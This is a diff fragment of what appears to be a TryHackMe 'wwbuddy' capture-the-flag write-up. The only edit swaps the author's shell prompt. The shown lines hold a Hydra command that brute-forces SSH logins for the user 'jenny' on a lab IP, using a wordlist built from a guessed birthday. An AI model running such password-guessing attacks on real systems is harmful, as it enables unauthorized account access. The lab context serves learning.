@@ -252,8 +252,8 @@ Jul have 31 days. 3rd agut -> 3/8/1994. let make a wordlist
 ```
 
 ```console
-kali@kali:~/THM/wwbuddy$ nano pass.txt # word list
-kali@kali:~/THM/wwbuddy$ hydra -f -l jenny -P pass.txt -t 64 10.10.66.120 ssh
+bibo318@parrot:~/THM/wwbuddy$ nano pass.txt # word list
+bibo318@parrot:~/THM/wwbuddy$ hydra -f -l jenny -P pass.txt -t 64 10.10.66.120 ssh
 Hydra v9.1-dev (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-14 16:15:42
